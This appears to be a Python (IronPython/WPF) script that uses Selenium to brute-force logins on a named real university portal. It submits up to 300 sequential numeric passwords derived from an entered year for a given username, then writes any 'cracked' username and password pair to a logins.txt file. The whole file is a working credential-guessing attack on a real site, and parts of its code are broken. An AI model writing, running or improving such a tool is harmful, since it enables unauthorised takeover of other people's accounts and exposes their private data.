import wpf
from selenium import webdriver
import os ,zipfile, time
from System.Windows import Application, Window
def save():
    with open ("xlassix.py",'r+') as l:
        line=l.readlines()
        self.rich.Text+= 'saving.\n'
        for i,le in enumerate(line):
            self.rich.Text+= 'saving..\n'
            if re.match(r"password=\d+",le.strip()):
                self.rich.Text+='saving...\n'
                line[i]='password='+str(password+count)+'\n'
    with open ("xlassix.py",'w+') as new:
        new.writelines(line)
        self.rich.Text+='saved\n'
class MyWindow(Window):
    def __init__(self):
        line=""
        count=0
        first=True
        data=" "
        wpf.LoadComponent(self, 'xlassix.xaml')
        self.rich=self.FindName('box')
        self.user=self.FindName('username')
        self.year=self.FindName('year')
        self.warning=self.FindName("inyear")
        self.rich.Text='fill in the forms'+'\n'
    def text_TextChanged(self, sender, e):
        pass
    def year_TextChanged(self, sender, e):
        pass
    def start_Click(self, sender, e):
        data="            "
        i=0
        first=True
        self.rich.Text='pls wait'+'\n'
        try:
            password=10000*int(self.year.Text)
        except :
            self.year.Text=""
            password=0
            self.warning.Content="invalid input"
            pass
        self.rich.Text+='password :'+str(password)+'\n'
        user=str(self.user.Text)
        browser= webdriver.Chrome("chromedriver.exe")
        browser.get("http://gateway.futa.edu.ng/login")
        c=browser.find_element_by_xpath(r"/html/body/header/nav/div/div/div/div[2]/form/input[3]")
        try:
            while i< 300:
                if 'tatus' in browser.title or "login" in data or "multaneous" in data:
                    with open ("logins.txt",'a+') as why:
                        why.writelines(str(user+'\t'+str(password+count)+'\n'))
                    self.rich.Text+='cracked password ='+str(password+i-1)+'\n'
                    break
                elif "regis" in data:
                    self.rich.Text+='user dont exist'+'\n'
                    break
                elif i==300:
                    self.rich.Text+='year not found in the year, try another year'+'\n'
                    break
                passwordslot = browser.find_element_by_xpath(r"/html/body/header/nav/div/div/div/div[2]/form/input[4]")
                if first==True:
                    c.send_keys(user)
                    first=False
                passwordslot.send_keys(str(password+i))
                browser.find_element_by_xpath(r"/html/body/header/nav/div/div/div/div[2]/form/button").click()
                me = browser.find_element_by_xpath(r"/html/body/header/nav/div/div/div/div[2]/div")
                data= me.text
                self.rich.Text+=browser.title+ '\t'+data+'\n'
                if ('server' in data):
                    count=count-1
                i+=1
            self.rich.Text+='pls hold on for a minute colating data'+'\n'
            browser.quit()
            self.rich.Text+='browser.closed'+'\n'
        except:
            self.rich.Text+='browser.closed'+'\n'
if __name__ == '__main__':
    Application().Run(MyWindow())

